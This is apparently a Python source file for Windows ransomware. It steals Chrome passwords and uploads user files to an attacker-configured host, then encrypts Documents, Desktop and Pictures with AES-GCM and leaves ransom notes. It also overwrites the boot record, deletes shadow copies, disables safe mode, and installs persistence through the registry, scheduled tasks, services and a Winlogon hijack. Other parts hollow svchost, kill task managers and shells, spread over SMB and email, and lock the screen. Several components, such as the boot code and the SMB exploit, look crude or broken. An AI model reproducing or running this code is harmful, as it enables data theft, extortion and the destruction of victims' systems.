import tkinter as tk
import json
import os
import sys
import win32gui
import win32con
import win32api
import threading
import hashlib
import time
import psutil
import winreg
import random
import string
import ctypes
import socket
import base64
import shutil
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import win32crypt
import sqlite3
import subprocess
import pefile
import struct
import py_compile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32process
import dis  # For opcode manipulation
import impacket.smbconnection  # Assume installed for advanced SMB

# Constants
secret = b"your secretkey"
HOST = 'enter your IP'
PORT = 9999
iv = b'0000000000000000'
cipher = AES.new(secret, AES.MODE_CFB, iv)
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# RSA public key for key transmission
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
RSA public key
-----END PUBLIC KEY-----"""

# String encryption at runtime
def encrypt_string(s):
    key = get_random_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(get_random_bytes(8)), backend=default_backend())
    encryptor = cipher.encryptor()
    return key, encryptor.update(s.encode()) + encryptor.finalize()

def decrypt_string(encrypted, key):
    cipher = Cipher(algorithms.AES(key), modes.CTR(get_random_bytes(8)), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted) + decryptor.finalize()

# Obfuscated sleep
def obfuscated_sleep(duration):
    start = time.time()
    while time.time() - start < duration:
        _ = sum(i**2 for i in range(1000))  # Computation to obfuscate

# API Unhooking
def unhook_api():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')
        orig_addr = kernel32.GetProcAddress(ntdll._handle, b'NtTerminateProcess')
        clean_ntdll = kernel32.LoadLibraryA(b'ntdll.dll')
        clean_addr = kernel32.GetProcAddress(clean_ntdll, b'NtTerminateProcess')
        orig_bytes = ctypes.create_string_buffer(5)
        kernel32.ReadProcessMemory(ctypes.c_int(-1), ctypes.c_void_p(clean_addr), orig_bytes, 5, None)
        old_protect = ctypes.c_uint32()
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), 5, 0x40, ctypes.byref(old_protect))
        kernel32.WriteProcessMemory(ctypes.c_int(-1), ctypes.c_void_p(orig_addr), orig_bytes, 5, None)
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), 5, old_protect, ctypes.byref(old_protect))
    except:
        pass

# Advanced Code Obfuscation with Opcode Remapping, Junk Code, Name Mangling
def obfuscate_code(code):
    try:
        import ast
        class NameMangler(ast.NodeTransformer):
            def __init__(self):
                self.names = {}
            def visit_Name(self, node):
                if node.id not in self.names:
                    self.names[node.id] = '_' + ''.join(random.choices(string.ascii_letters + string.digits, k=20))
                node.id = self.names[node.id]
                return node
        tree = ast.parse(code)
        mangler = NameMangler()
        mangled_tree = mangler.visit(tree)
        mangled_code = ast.unparse(mangled_tree)
        junk_code = """
import random
_ = random.random() * 42
if _ > 100: print('junk')
"""
        mangled_code = junk_code + mangled_code
        co = compile(mangled_code, '<string>', 'exec')
        bytecode = dis.Bytecode(co)
        modified_ops = bytearray(co.co_code)
        for i in range(len(modified_ops)):
            if modified_ops[i] == 90:
                modified_ops[i] = 100
        new_co = type(co)(co.co_argcount, co.co_posonlyargcount, co.co_kwonlyargcount, co.co_nlocals, co.co_stacksize,
                          co.co_flags, bytes(modified_ops), co.co_consts, co.co_names, co.co_varnames,
                          co.co_filename, co.co_name, co.co_qualname, co.co_firstlineno, co.co_lnotab,
                          co.co_exceptiontable, co.co_freevars, co.co_cellvars)
        exec(new_co)
        key = get_random_bytes(16)
        xored = ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(mangled_code))
        poly_code = f"""
import base64
def decode(s, k):
    return ''.join(chr(ord(c) ^ k[i % len(k)]) for i, c in enumerate(s))
key = {repr(base64.b64encode(key).decode())}
code = {repr(base64.b64encode(xored.encode()).decode())}
exec(decode(base64.b64decode(code).decode(), base64.b64decode(key)))
"""
        temp_file = "temp.py"
        with open(temp_file, "w") as f:
            f.write(poly_code)
        py_compile.compile(temp_file, "temp.pyc")
        subprocess.run("pyinstaller --onefile --noconsole temp.pyc", shell=True, capture_output=True)
        pe_file = "dist/temp.exe"
        if os.path.exists(pe_file):
            pe = pefile.PE(pe_file)
            for section in pe.sections:
                section_data = section.get_data()
                section_data = bytes(b ^ 0x5A for b in section_data)
                pe.set_bytes_at_offset(section.PointerToRawData, section_data)
            packed_file = "dist/packed_temp.exe"
            pe.write(packed_file)
            with open(packed_file, "rb") as f:
                packed_code = f.read()
            os.remove(temp_file)
            os.remove("temp.pyc")
            shutil.rmtree("dist", ignore_errors=True)
            shutil.rmtree("build", ignore_errors=True)
            os.remove("temp.spec")
            return packed_code
        else:
            raise Exception("PE conversion failed")
    except:
        return code

# Inline Hook for NtTerminateProcess
def hook_terminate():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')
        orig_addr = kernel32.GetProcAddress(ntdll._handle, b'NtTerminateProcess')
        orig_bytes = ctypes.create_string_buffer(5)
        kernel32.ReadProcessMemory(ctypes.c_int(-1), ctypes.c_void_p(orig_addr), orig_bytes, 5, None)
        detour_code = (
            b"\x55"                      # push rbp
            b"\x48\x89\xE5"              # mov rbp, rsp
            b"\xB8\x00\x00\x00\x00"      # mov eax, 0
            b"\x5D"                      # pop rbp
            b"\xC3"                      # ret
        )
        detour_addr = kernel32.VirtualAlloc(None, len(detour_code) + 5, 0x1000 | 0x2000, 0x40)
        trampoline = orig_bytes.raw + b"\xE9" + struct.pack('<i', orig_addr + 5 - (detour_addr + len(detour_code) + 5))
        kernel32.WriteProcessMemory(ctypes.c_int(-1), detour_addr, detour_code + trampoline, len(detour_code) + 5, None)
        jump_offset = detour_addr - (orig_addr + 5)
        hook_bytes = b'\xE9' + struct.pack('<i', jump_offset)
        old_protect = ctypes.c_uint32()
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), len(hook_bytes), 0x40, ctypes.byref(old_protect))
        kernel32.WriteProcessMemory(ctypes.c_int(-1), ctypes.c_void_p(orig_addr), hook_bytes, len(hook_bytes), None)
        kernel32.VirtualProtect(ctypes.c_void_p(orig_addr), len(hook_bytes), old_protect, ctypes.byref(old_protect))
    except:
        pass

# MBR Lock
def lm():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        bootloader = (
            b"\xB8\x00\x80\x00\x00"  # mov eax, 0x8000
            b"\xBB\x00\x00\x02\x00"  # mov ebx, 0x20000
            b"\xB9\x07\x00\x00\x00"  # mov ecx, 0x07
            b"\xBA\x00\x00\x00\x00"  # mov edx, 0
            b"\xBE\x00\x00\x00\x00"  # mov esi, 0
            b"\xCD\x10"              # int 0x10
            b"\xB8\x00\x00\x00\x00"  # mov eax, 0
            b"\xCD\x13"              # int 0x13
            b"\xEB\xFE"              # jmp $
        )
        with open(r"\\.\PhysicalDrive0", "r+b") as disk:
            mbr = bytearray(512)
            ransom_msg = f"CHKDSK is verifying files... System Locked! Contact Telegram: @RansomBot ID: {vid}".encode()
            mbr[:len(bootloader)] = bootloader
            mbr[len(bootloader):len(bootloader)+len(ransom_msg)] = ransom_msg
            mbr[-2:] = b'\x55\xAA'
            disk.write(mbr)
        subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True, capture_output=True)
    except:
        pass

# Credential Provider Hijack
def cp_hijack():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return
        cp_path = os.path.join(os.getenv("TEMP"), f"cp_{rn()}.dll")
        cp_code = """
#include <windows.h>
#include <credentialprovider.h>
typedef struct _CRED_PROVIDER {
    IUnknownVtbl* lpVtbl;
} CRED_PROVIDER;
HRESULT CALLBACK QueryInterface(void* self, REFIID riid, void** ppvObj) { return E_NOINTERFACE; }
ULONG CALLBACK AddRef(void* self) { return 1; }
ULONG CALLBACK Release(void* self) { return 1; }
HRESULT CALLBACK SetUsageScenario(void* self, CREDENTIAL_PROVIDER_USAGE_SCENARIO cpus, DWORD dwFlags) {
    system("start screenlock.exe");
    return S_OK;
}
static IUnknownVtbl vtbl = { QueryInterface, AddRef, Release, SetUsageScenario };
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CRED_PROVIDER* cp = (CRED_PROVIDER*)HeapAlloc(GetProcessHeap(), 0, sizeof(CRED_PROVIDER));
        cp->lpVtbl = &vtbl;
    }
    return TRUE;
}
"""
        with open("cp.c", "w") as f:
            f.write(cp_code)
        subprocess.run("cl.exe /LD cp.c /link /out:{} comctl32.lib".format(cp_path), shell=True, capture_output=True)
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "{random_guid}", 0, winreg.REG_SZ, cp_path)
    except:
        pass

# Advanced SMB Spread with EternalBlue Exploit
def spread_smb():
    try:
        from impacket import smbconnection
        from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
        from impacket.smb import SMB_DIALECT
        target_ip = "192.168.1.0/24"
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            try:
                conn = smbconnection.SMBConnection(ip, ip, preferredDialect=SMB_DIALECT)
                conn.login('', '')
                groom_trans = []
                for _ in range(12):
                    groom = smbconnection.SMBConnection(ip, ip)
                    groom.login('', '')
                    groom_trans.append(groom)
                exploit_packet = b"\x00" * 4 + b"\xfeSMB" + b"\x00" * 60
                conn.sendSMB(exploit_packet)
                payload = open(sys.executable, "rb").read()
                conn.sendSMB(payload)
                conn.close()
            except:
                continue
    except:
        pass

# Advanced Email Spread with Obfuscated Attachment
def sb():
    try:
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email.mime.text import MIMEText
        from email import encoders
        msg = MIMEMultipart()
        msg['Subject'] = "Important System Update"
        msg['From'] = "admin@trusted.com"
        msg['To'] = "victim@localhost"
        msg['Reply-To'] = "admin@trusted.com"
        body = "Please open the attached file for important updates."
        msg.attach(MIMEText(body, 'plain'))
        payload = open(sys.executable, "rb").read()
        xor_key = 0x5A
        obfuscated_payload = bytes(b ^ xor_key for b in payload)
        part = MIMEBase('application', "octet-stream")
        part.set_payload(obfuscated_payload)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename="update.docm")
        msg.attach(part)
        with smtplib.SMTP('localhost', 25) as server:
            server.send_message(msg)
        spread_smb()
    except:
        pass

# Data Steal
def steal_data():
    try:
        data = {}
        chrome_path = os.path.join(os.getenv("APPDATA"), "Google\\Chrome\\User Data\\Default\\Login Data")
        if os.path.exists(chrome_path):
            temp_db = os.path.join(os.getenv("TEMP"), f"login_data_{rn()}.db")
            shutil.copyfile(chrome_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    data[url] = {"username": username, "password": decrypted_password}
                except:
                    continue
            conn.close()
            os.remove(temp_db)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.send(EncodeAES(cipher, json.dumps(data).encode()))
    except:
        pass

# Process Hollowing
def ph():
    kernel32 = ctypes.WinDLL('kernel32')
    exe = sys.executable
    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", ctypes.wintypes.DWORD),
            ("lpReserved", ctypes.wintypes.LPWSTR),
            ("lpDesktop", ctypes.wintypes.LPWSTR),
            ("lpTitle", ctypes.wintypes.LPWSTR),
            ("dwX", ctypes.wintypes.DWORD),
            ("dwY", ctypes.wintypes.DWORD),
            ("dwXSize", ctypes.wintypes.DWORD),
            ("dwYSize", ctypes.wintypes.DWORD),
            ("dwXCountChars", ctypes.wintypes.DWORD),
            ("dwYCountChars", ctypes.wintypes.DWORD),
            ("dwFillAttribute", ctypes.wintypes.DWORD),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("wShowWindow", ctypes.wintypes.WORD),
            ("cbReserved2", ctypes.wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
            ("hStdInput", ctypes.wintypes.HANDLE),
            ("hStdOutput", ctypes.wintypes.HANDLE),
            ("hStdError", ctypes.wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", ctypes.wintypes.HANDLE),
            ("hThread", ctypes.wintypes.HANDLE),
            ("dwProcessId", ctypes.wintypes.DWORD),
            ("dwThreadId", ctypes.wintypes.DWORD),
        ]

    class CONTEXT64(ctypes.Structure):
        _fields_ = [
            ("P1Home", ctypes.c_uint64),
            ("P2Home", ctypes.c_uint64),
            ("P3Home", ctypes.c_uint64),
            ("P4Home", ctypes.c_uint64),
            ("P5Home", ctypes.c_uint64),
            ("P6Home", ctypes.c_uint64),
            ("ContextFlags", ctypes.c_uint32),
            ("MxCsr", ctypes.c_uint32),
            ("SegCs", ctypes.c_uint16),
            ("SegDs", ctypes.c_uint16),
            ("SegEs", ctypes.c_uint16),
            ("SegFs", ctypes.c_uint16),
            ("SegGs", ctypes.c_uint16),
            ("SegSs", ctypes.c_uint16),
            ("EFlags", ctypes.c_uint32),
            ("Dr0", ctypes.c_uint64),
            ("Dr1", ctypes.c_uint64),
            ("Dr2", ctypes.c_uint64),
            ("Dr3", ctypes.c_uint64),
            ("Dr6", ctypes.c_uint64),
            ("Dr7", ctypes.c_uint64),
            ("Rax", ctypes.c_uint64),
            ("Rcx", ctypes.c_uint64),
            ("Rdx", ctypes.c_uint64),
            ("Rbx", ctypes.c_uint64),
            ("Rsp", ctypes.c_uint64),
            ("Rbp", ctypes.c_uint64),
            ("Rsi", ctypes.c_uint64),
            ("Rdi", ctypes.c_uint64),
            ("R8", ctypes.c_uint64),
            ("R9", ctypes.c_uint64),
            ("R10", ctypes.c_uint64),
            ("R11", ctypes.c_uint64),
            ("R12", ctypes.c_uint64),
            ("R13", ctypes.c_uint64),
            ("R14", ctypes.c_uint64),
            ("R15", ctypes.c_uint64),
            ("Rip", ctypes.c_uint64),
            ("Xmm0", ctypes.c_byte * 16),
            ("Xmm1", ctypes.c_byte * 16),
            ("Xmm2", ctypes.c_byte * 16),
            ("Xmm3", ctypes.c_byte * 16),
            ("Xmm4", ctypes.c_byte * 16),
            ("Xmm5", ctypes.c_byte * 16),
            ("Xmm6", ctypes.c_byte * 16),
            ("Xmm7", ctypes.c_byte * 16),
            ("Xmm8", ctypes.c_byte * 16),
            ("Xmm9", ctypes.c_byte * 16),
            ("Xmm10", ctypes.c_byte * 16),
            ("Xmm11", ctypes.c_byte * 16),
            ("Xmm12", ctypes.c_byte * 16),
            ("Xmm13", ctypes.c_byte * 16),
            ("Xmm14", ctypes.c_byte * 16),
            ("Xmm15", ctypes.c_byte * 16),
        ]

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    creation_flags = 0x4
    success = kernel32.CreateProcessW(
        ctypes.c_wchar_p("C:\\Windows\\System32\\svchost.exe"),
        None, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi)
    )
    if not success:
        return
    try:
        with open(exe, "rb") as f:
            data = f.read()
        pe = pefile.PE(data=data)
        image_base = pe.OPTIONAL_HEADER.ImageBase
        remote_addr = kernel32.VirtualAllocEx(pi.hProcess, None, pe.OPTIONAL_HEADER.SizeOfImage, 0x1000 | 0x2000, 0x40)
        for section in pe.sections:
            section_data = section.get_data()
            section_addr = remote_addr + section.VirtualAddress
            kernel32.WriteProcessMemory(pi.hProcess, section_addr, section_data, len(section_data), None)
        if hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
            delta = remote_addr - image_base
            for entry in pe.DIRECTORY_ENTRY_BASERELOC:
                for reloc in entry.entries:
                    reloc_addr = remote_addr + reloc.rva
                    value = ctypes.c_uint64()
                    kernel32.ReadProcessMemory(pi.hProcess, reloc_addr, ctypes.byref(value), 8, None)
                    value.value += delta
                    kernel32.WriteProcessMemory(pi.hProcess, reloc_addr, ctypes.byref(value), 8, None)
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for dll in pe.DIRECTORY_ENTRY_IMPORT:
                dll_handle = kernel32.LoadLibraryW(dll.dll.decode())
                for imp in dll.imports:
                    if imp.name:
                        imp_addr = kernel32.GetProcAddress(dll_handle, imp.name)
                        kernel32.WriteProcessMemory(pi.hProcess, remote_addr + imp.address, ctypes.byref(ctypes.c_uint64(imp_addr)), 8, None)
        entry_point = remote_addr + pe.OPTIONAL_HEADER.AddressOfEntryPoint
        context = CONTEXT64()
        context.ContextFlags = 0x100000 | 0x10
        kernel32.GetThreadContext(pi.hThread, ctypes.byref(context))
        context.Rip = entry_point
        kernel32.SetThreadContext(pi.hThread, ctypes.byref(context))
        kernel32.ResumeThread(pi.hThread)
    except:
        kernel32.TerminateProcess(pi.hProcess, 0)
    finally:
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

# Partial File Encryption, Send to Server, Send Key Securely, Create Ransom Note
def ef():
    k = get_random_bytes(32)  # AES-256
    iv = get_random_bytes(12)  # GCM nonce
    td = [
        os.path.join(os.getenv("USERPROFILE"), "Documents"),
        os.path.join(os.getenv("USERPROFILE"), "Desktop"),
        os.path.join(os.getenv("USERPROFILE"), "Pictures")
    ]
    cs = 1 * 1024 * 1024
    random_ext = '.' + ''.join(random.choices(string.ascii_lowercase, k=5))
    ransom_note = f"""
Your files have been encrypted!
To decrypt, pay 0.5 BTC to: [BTC Address]
Contact us at: ransom@email.com with ID: {vid}
Do not modify or delete files, or they will be lost forever.
"""
    key_file = os.path.join(os.getenv("TEMP"), f"key_{rn()}.bin")
    with open(key_file, "wb") as kf:
        kf.write(k + iv + random_ext.encode())
    hf(key_file)  # Hide key file
    for d in td:
        try:
            for r, _, f in os.walk(d):
                for fn in f:
                    fp = os.path.join(r, fn)
                    try:
                        if not fp.endswith(random_ext):
                            with open(fp, "rb+") as file:
                                data = file.read()
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                s.connect((HOST, PORT))
                                filename_bytes = fp.encode()
                                s.send(len(filename_bytes).to_bytes(4, 'big'))
                                s.send(filename_bytes)
                                s.send(len(data).to_bytes(8, 'big'))
                                s.sendall(data)
                            file_size = len(data)
                            if file_size > cs:
                                encrypted_data = bytearray(data)
                                block_size = 64 * 1024
                                cipher_enc = AES.new(k, AES.MODE_GCM, nonce=iv)
                                for offset in range(0, file_size, block_size * 2):
                                    block = data[offset:offset + block_size]
                                    if block:
                                        ct, tag = cipher_enc.encrypt_and_digest(block)
                                        encrypted_data[offset:offset + len(ct)] = ct
                                        if offset + block_size >= file_size:
                                            encrypted_data.extend(tag)
                                with open(fp + random_ext, "wb") as enc_file:
                                    enc_file.write(encrypted_data)
                            else:
                                cipher_enc = AES.new(k, AES.MODE_GCM, nonce=iv)
                                ct, tag = cipher_enc.encrypt_and_digest(data)
                                with open(fp + random_ext, "wb") as enc_file:
                                    enc_file.write(ct + tag)
                            os.remove(fp)
                    except:
                        pass
                note_path = os.path.join(r, 'README.txt')
                with open(note_path, 'w') as note:
                    note.write(ransom_note)
        except:
            pass
    try:
        rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        encrypted_key = rsa_cipher.encrypt(k + iv)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.send(b'KEY:' + base64.b64encode(encrypted_key))
    except:
        pass
    return k, iv, random_ext, key_file

# File Decryption
def decrypt_files(key_file):
    try:
        with open(key_file, "rb") as kf:
            key_data = kf.read()
        k = key_data[:32]  # AES-256 key
        iv = key_data[32:44]  # GCM nonce
        random_ext = key_data[44:].decode()  # File extension
        td = [
            os.path.join(os.getenv("USERPROFILE"), "Documents"),
            os.path.join(os.getenv("USERPROFILE"), "Desktop"),
            os.path.join(os.getenv("USERPROFILE"), "Pictures")
        ]
        for d in td:
            for r, _, f in os.walk(d):
                for fn in f:
                    fp = os.path.join(r, fn)
                    if fp.endswith(random_ext):
                        try:
                            with open(fp, "rb") as file:
                                data = file.read()
                            file_size = len(data)
                            if file_size > 1 * 1024 * 1024:
                                tag = data[-16:]
                                decrypted_data = bytearray(data[:-16])
                                block_size = 64 * 1024
                                cipher_dec = AES.new(k, AES.MODE_GCM, nonce=iv)
                                for offset in range(0, file_size - 16, block_size * 2):
                                    block = data[offset:offset + block_size]
                                    if block:
                                        decrypted_block = cipher_dec.decrypt(block)
                                        decrypted_data[offset:offset + len(decrypted_block)] = decrypted_block
                                cipher_dec.verify(tag)
                            else:
                                tag = data[-16:]
                                cipher_dec = AES.new(k, AES.MODE_GCM, nonce=iv)
                                decrypted_data = cipher_dec.decrypt_and_verify(data[:-16], tag)
                            original_file = fp[:-len(random_ext)]
                            with open(original_file, "wb") as dec_file:
                                dec_file.write(decrypted_data)
                            os.remove(fp)
                        except:
                            pass
                note_path = os.path.join(r, 'README.txt')
                if os.path.exists(note_path):
                    os.remove(note_path)
        os.remove(key_file)
    except:
        pass

# Anti-analysis
def ia():
    return False  # Temporarily disabled for testing

# Hide File
def hf(p):
    try:
        win32api.SetFileAttributes(p, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
    except:
        pass

# Self-copy
def sc():
    exe = sys.executable
    dirs = [
        os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows"),
        os.getenv("TEMP"),
        os.path.join(os.getenv("ProgramData"), "Microsoft"),
        os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    ]
    for d in dirs:
        try:
            if not os.path.exists(d):
                os.makedirs(d)
            cp = os.path.join(d, f"s_{rn()}.exe")
            with open(exe, "rb") as src, open(cp, "wb") as dst:
                dst.write(src.read())
            hf(cp)
        except:
            pass

# Random Name Generator
def rn(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# Registry run
def rr():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, f"s_{rn()}", 0, winreg.REG_SZ, f'"{sys.executable}"')
        winreg.CloseKey(key)
    except:
        pass

# Scheduled task
def ct():
    tn = f"s_task_{rn()}"
    cmd = f'schtasks /create /tn "{tn}" /tr "\"{sys.executable}\" --service" /sc minute /mo 5 /rl HIGHEST /f'
    try:
        subprocess.run(cmd, shell=True, capture_output=True, check=True)
    except:
        pass

# Install service
def is1():
    sn = f"s_svc_{rn()}"
    cmd = f'sc create "{sn}" binPath= "\"{sys.executable} --service\" start= auto'
    try:
        subprocess.run(cmd, shell=True, capture_output=True, check=True)
        subprocess.run(f'sc start "{sn}"', shell=True, capture_output=True)
    except:
        pass

# Watchdog
def we():
    try:
        while True:
            try:
                if not any(proc.name().lower() == os.path.basename(sys.executable).lower() for proc in psutil.process_iter(['name'])):
                    subprocess.run(f'start "" "{sys.executable}"', shell=True)
                time.sleep(1)
            except:
                pass
    except:
        pass

# Disable recovery
def dr():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, capture_output=True)
        subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f", shell=True, capture_output=True)
    except:
        pass

# Tamper protection
def tp():
    threading.Thread(target=lambda: [
        time.sleep(5),
        open(r"\\.\PhysicalDrive0", "rb").read(512)[-2:] != b'\x55\xAA' and lm()
    ] * 1000, daemon=True).start()

# Set critical process
def spc():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        ntdll = ctypes.WinDLL('ntdll')
        RtlSetProcessIsCritical = ntdll.RtlSetProcessIsCritical
        RtlSetProcessIsCritical.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int), ctypes.c_int]
        old_value = ctypes.c_int()
        RtlSetProcessIsCritical(1, ctypes.byref(old_value), 0)
    except:
        pass

# Modify Winlogon Shell
def modify_shell():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return
        exe_path = sys.executable
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, f'"{exe_path}"')
    except:
        pass

# Disable Safe Mode
def disable_safe_mode():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return
        subprocess.run("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShell /t REG_SZ /d cmd.exe /f", shell=True, capture_output=True)
        subprocess.run("bcdedit /set {default} safeboot minimal", shell=True, capture_output=True)
    except:
        pass

# Self-defense
def sd():
    bl = [
        'taskmgr.exe', 'regedit.exe', 'msconfig.exe', 'procexp.exe',
        'processhacker.exe', 'taskkill.exe', 'cmd.exe', 'powershell.exe'
    ]
    while True:
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in bl:
                    try:
                        proc.terminate()
                    except:
                        pass
            if not any(proc.name().lower() in [os.path.basename(sys.executable).lower()] for proc in psutil.process_iter(['name'])):
                subprocess.run(f'start "" "{sys.executable}"', shell=True)
            time.sleep(1)
        except:
            pass

# Global Keyboard Hook for Screen Locker Protection
def global_keyboard_hook():
    user32 = ctypes.WinDLL('user32')
    def low_level_keyboard_proc(nCode, wParam, lParam):
        if wParam == 256:
            key = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_long)).contents.value
            if key in [0x1B, 0x73, 0x5B]:
                print(f"Blocked key: {key}")
                return 1
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    pointer = CMPFUNC(low_level_keyboard_proc)
    hook_id = user32.SetWindowsHookExA(13, pointer, None, 0)
    if hook_id == 0:
        print("Failed to set keyboard hook")
    msg = ctypes.wintypes.MSG()
    while True:
        user32.GetMessageA(ctypes.byref(msg), None, 0, 0)

# Tkinter UI for Screen Lock with Password Input
root = tk.Tk()
root.title("System Locked")
root.configure(bg="black")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)

def de():
    return
root.protocol("WM_DELETE_WINDOW", de)

def bk(e):
    if e.keysym in ["Escape", "Tab", "F4", "Control_L", "Control_R", "Alt_L", "Alt_R", "Super_L", "Super_R", "Delete"]:
        print(f"Blocked keysym: {e.keysym}")
        return "break"
    if e.state & 0x4 or e.state & 0x8 or e.state & 0x20000:
        print(f"Blocked modifier: {e.state}")
        return "break"
    return

def check_password():
    entered_password = password_entry.get()
    if entered_password == "1ucas":
        status_label.config(text="Decrypting files...", fg="green")
        root.update()
        decrypt_files(key_file)
        status_label.config(text="Files decrypted!", fg="green")
        root.update()
        root.after(1000, root.destroy)  # Close window after 1 second
    else:
        status_label.config(text="Incorrect password!", fg="yellow")

vid = hashlib.sha256((os.getenv("COMPUTERNAME", "Unknown") + str(time.time())).encode()).hexdigest()[:16]
msg = "Files encrypted!\nTelegram: @RansomBot\nID: [V]\nPay to decrypt!\nYour files are locked.\nEnter password to unlock:"
rn_msg = msg.replace("[V]", vid)

l1 = tk.Label(root, text="System Locked!", font=("Arial", 30, "bold"), fg="red", bg="black")
l1.pack(pady=20)
l2 = tk.Label(root, text=rn_msg, font=("Arial", 20), fg="red", bg="black", justify="center")
l2.pack(pady=20)
password_label = tk.Label(root, text="Password:", font=("Arial", 15), fg="white", bg="black")
password_label.pack(pady=10)
password_entry = tk.Entry(root, show="*", font=("Arial", 15), width=20)
password_entry.pack(pady=10)
unlock_button = tk.Button(root, text="Unlock", command=check_password, font=("Arial", 15), fg="white", bg="red")
unlock_button.pack(pady=10)
status_label = tk.Label(root, text="", font=("Arial", 15), fg="yellow", bg="black")
status_label.pack(pady=10)

root.bind("<Key>", bk)
root.bind("<Return>", lambda event: check_password())

def bi():
    while True:
        try:
            hwnd = win32gui.GetForegroundWindow()
            root_id = root.winfo_id()
            print(f"Current hwnd: {hwnd}, Root hwnd: {root_id}")
            if hwnd != root_id:
                win32gui.SetForegroundWindow(root_id)
            time.sleep(0.1)
        except Exception as e:
            print(f"Error in bi: {e}")

def kt():
    while True:
        try:
            root.attributes('-topmost', True)
            win32gui.SetWindowPos(root.winfo_id(), win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
            time.sleep(0.1)
        except Exception as e:
            print(f"Error in kt: {e}")

# Main Execution
if __name__ == "__main__":
    print("Starting ransomware execution...")
    unhook_api()
    if ia():
        print("Anti-analysis triggered, exiting...")
        os._exit(0)
    hf(sys.executable)
    sc()
    rr()
    ct()
    is1()
    threading.Thread(target=we, daemon=True).start()
    dr()
    if ctypes.windll.shell32.IsUserAnAdmin():
        print("Running as admin, executing admin-specific functions...")
        lm()
        spc()
        tp()
        modify_shell()
        disable_safe_mode()
        cp_hijack()
    else:
        print("Not running as admin, skipping admin-specific functions...")
    threading.Thread(target=global_keyboard_hook, daemon=True).start()
